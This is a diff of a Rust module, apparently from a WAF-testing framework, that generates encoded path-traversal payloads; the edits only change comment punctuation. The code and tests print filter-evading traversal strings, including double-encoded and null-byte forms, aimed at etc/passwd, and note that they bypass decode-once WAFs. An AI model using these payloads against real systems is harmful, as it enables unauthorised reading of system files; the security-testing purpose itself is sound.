@@ -1,5 +1,5 @@
 //! Path-traversal payload-string equivalence + the joint
-//! `(payload × delivery)` generator — the path arm of Phase B.
+//! `(payload × delivery)` generator (the path arm of Phase B).
 //!
 //! Rewrites only the WAF-visible *encoding* of the traversal; the
 //! operator's inferred target file is preserved verbatim (anti-rig:
@@ -9,7 +9,7 @@
 
 use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};
 
-/// Loose percent-decode (single pass) + lowercase — the WAF/decoder
+/// Loose percent-decode (single pass) + lowercase, the WAF/decoder
 /// view. Handles `%2f`, `%2e`, `%5c`, `%00`, double-encoded one level.
 fn pct_decode(s: &str) -> String {
     let b: Vec<char> = s.chars().collect();
@@ -81,7 +81,7 @@ pub fn still_resolves(original: &str, cand: &str) -> bool {
     }
     let nc = normalize(cand);
     if !nc.contains(&tgt) {
-        return false; // target was changed/lost — anti-rig
+        return false; // target was changed/lost, anti-rig
     }
     // mechanism still present: a `..` traversal or an absolute path.
     let no = normalize(original);
@@ -101,7 +101,7 @@ fn enc_slash(rng: &mut Rng) -> &'static str {
     // Index (not `*rng.pick`) so there is no explicit deref for clippy
     // to flag; identical RNG draw (`pick` is `below(len)` internally).
     // F108: pre-fix array was `["/", "%2f", "%252f", "%c0%af", "%5c", "/"]`
-    // — `/` appeared at index 0 AND index 5, biasing the identity form
+    //: `/` appeared at index 0 AND index 5, biasing the identity form
     // to 33% (intended ~17%). Same applies to enc_dot below where `.`
     // appeared twice (50% identity instead of 25%). Both duplicates
     // are unintended over-representations of the identity form.
@@ -125,8 +125,8 @@ fn enc_dotdot(rng: &mut Rng) -> String {
         4 => "....//".into(),
         5 => "..%00/".into(),
         // Double-encoded traversal: `%252e` → `%2e` → `.` under a
-        // two-pass decoder. Sound — [`normalize`] decodes twice, so the
-        // segment folds to `..` and the target check still binds — and
+        // two-pass decoder. Sound: [`normalize`] decodes twice, so the
+        // segment folds to `..` and the target check still binds, and
         // it specifically defeats the common "decode once, then block
         // `..`/`%2e`" filter that a single-encoded form does not.
         6 => "%252e%252e".into(),
@@ -302,7 +302,7 @@ mod tests {
     fn double_encoded_dotdot_is_sound_and_folds_to_target() {
         // `%252e%252e` decodes `%252e`→`%2e`→`.` over the two-pass
         // resolver view, so the traversal folds to the same path and
-        // the oracle accepts it — while a decode-once WAF still sees an
+        // the oracle accepts it, while a decode-once WAF still sees an
         // opaque `%252e` and does not match a `..`/`%2e%2e` rule.
         assert_eq!(
             normalize("%252e%252e%2f%252e%252e%2fetc/passwd"),
@@ -313,7 +313,7 @@ mod tests {
             "%252e%252e/%252e%252e/etc/passwd"
         ));
         // ...and the single-decode view (what a one-pass WAF sees) is
-        // NOT yet a bare `..` — proving the bypass value, not just
+        // NOT yet a bare `..`: proving the bypass value, not just
         // soundness.
         assert!(!pct_decode("%252e%252e").contains(".."));
     }
